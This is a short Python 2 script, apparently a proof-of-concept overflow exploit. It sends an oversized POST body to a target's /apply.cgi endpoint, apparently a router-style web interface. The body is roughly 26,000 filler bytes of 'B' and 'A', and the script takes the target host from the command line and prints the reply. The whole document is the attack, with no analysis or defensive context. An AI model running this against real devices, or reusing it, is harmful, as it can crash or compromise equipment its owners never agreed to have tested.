import sys
import urllib2
try:
	target=sys.argv[1]
except:
	print "Usage: %s <target>" % sys.argv[0]
	sys.exit(1)
url="http://%s/apply.cgi" % target
buf="\x42"*10000+"\x41"*0x4000		#POST parameter name
req=urllib2.Request(url,buf)
print urllib2.urlopen(req).read()
